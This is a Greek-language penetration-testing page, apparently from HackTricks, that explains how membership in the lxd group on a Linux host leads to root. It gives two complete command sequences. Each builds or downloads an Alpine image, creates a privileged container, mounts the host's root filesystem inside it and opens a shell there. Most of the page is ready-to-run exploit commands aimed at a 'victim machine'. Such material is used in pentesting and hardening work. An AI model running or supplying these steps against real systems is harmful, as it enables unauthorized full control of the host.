# lxd/lxc Group - Privilege escalation

Η συμμετοχή στην ομάδα διαχείρισης LXD του host (συνήθως _**lxd**_) μπορεί να παρέχει ένα path προς το root, επιτρέποντας τον πλήρη έλεγχο του daemon.<sup>[[1]](#references)</sup>

## Exploiting χωρίς internet

### Method 1

Μπορείτε να κατεβάσετε ένα Alpine image για χρήση με το LXD από ένα trusted repository.
Ο image server του Canonical για το LXD δημοσιεύει daily builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Απλώς κατεβάστε τα **lxd.tar.xz** και **rootfs.squashfs** από το νεότερο build (το όνομα του directory είναι η ημερομηνία).<sup>[[8]](#references)</sup>

Εναλλακτικά, μπορείτε να εγκαταστήσετε το distrobuilder στο machine σας ακολουθώντας τις [project instructions](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Μεταφορτώστε τα **incus.tar.xz** (**lxd.tar.xz** αν το κατεβάσατε από τον Canonical image server) και το **rootfs.squashfs**, έπειτα εισαγάγετε την image και δημιουργήστε ένα container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Αν εμφανιστεί αυτό το σφάλμα _**Error: No storage pool found. Please create a new storage pool**_\
> Εκτέλεσε **`lxd init`**, ρύθμισε ένα προεπιλεγμένο storage pool και, στη συνέχεια, επανέλαβε το προηγούμενο τμήμα εντολών.<sup>[[2]](#references)</sup>

Τέλος, εκκίνησε το container και άνοιξε ένα root shell στο filesystem του host:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Δημιουργήστε ένα Alpine image και εκκινήστε το με το flag `security.privileged=true`, το οποίο αντιστοιχίζει το root του container στο root του host· η προσάρτηση του `/` εκθέτει στη συνέχεια το filesystem του host μέσα στο container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Πώς να ενισχύσετε την ασφάλεια για το LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers και virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Πώς να αντιγράφετε και να εισάγετε images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Πώς να δημιουργείτε images με το distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
